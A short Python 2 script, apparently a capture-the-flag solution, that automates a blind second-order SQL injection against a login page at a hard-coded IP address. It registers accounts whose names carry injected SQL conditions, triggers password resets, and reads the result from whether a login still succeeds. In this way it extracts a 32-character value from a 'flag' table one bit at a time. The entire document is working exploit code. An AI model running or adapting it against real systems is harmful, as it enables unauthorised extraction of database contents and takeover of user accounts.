import requests
import random, string

def getUsername(length=8):
	while True:
		username=''.join([random.choice(string.letters+string.digits) for i in xrange(length)])
		r=requests.post('http://54.196.116.77/index.php?page=login',data={'name':username,'pass':'123','email':'barq@mailinator.com','register':True})
		if 'Success!' in r.content: return username
		print '.',r.content

def test(query,namelen=8):
	username=getUsername(namelen)
	injector="%s' AND %s-- "%(username,query)
	if len(injector)>64: raise Exception('max namelen==64: "%s"=%d'%(query,len(injector)))
	r=requests.post('http://54.196.116.77/index.php?page=login',data={'name':injector,'pass':'123','email':'barq@mailinator.com','register':True})
	if 'Success!' not in r.content: raise Exception('bad request: "%s"'%r.content)
	r=requests.post('http://54.196.116.77/index.php?page=login',data={'name':injector,'reset':True})
	if 'we\'re emailing you a new password at barq@mailinator.com' not in r.content: raise Exception('bad 2nd: "%s"'%r.content)
	r=requests.post('http://54.196.116.77/index.php?page=login',data={'name':username,'pass':'123','login':True})
	if 'Welcome back' in r.content: return False
	return True

def enumByte(base,byte,namelen=8):
	rval = ''
	template = '(ASCII(%s)>>%d)&1=1'
	for i in xrange(7,-1,-1):
		request = base%(template%(byte,i))
		rval += '1' if test(request,namelen) else '0'
	return int(rval,2)

def enumChar(base,byte,namelen=8):
	return chr(enumByte(base,byte,namelen))

def enumString(base,string,length,namelen=8):
	rval = ''
	template = 'SUBSTR(%s,%d,1)'
	for i in xrange(length):
		rval += enumChar(base,template%(string,i+1),namelen)
		print rval
	return rval

if __name__ == '__main__':
	#print test("0<(SELECT flag FROM flag)")
	print enumString('(SELECT %s FROM flag)','flag',32,3)
